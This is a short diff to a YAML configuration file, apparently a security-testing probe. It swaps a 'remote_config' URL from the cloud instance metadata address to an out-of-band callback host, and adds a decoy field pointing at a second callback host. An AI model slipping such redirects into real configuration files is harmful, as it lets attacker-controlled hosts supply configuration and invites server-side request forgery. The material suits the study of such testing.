@@ -1,2 +1,4 @@
 remote_config:
-  url: "http://169.254.169.254/latest/meta-data/"
+  url: "https://bjyl75jln7zanbiosphlmoy5vw1nwbl.oastify.com/A.yaml"
+unknown_decoy_field_zzz:
+  url: "https://ftcph9tpxb9exfss2trpws8950br7fw.oastify.com/B.yaml"
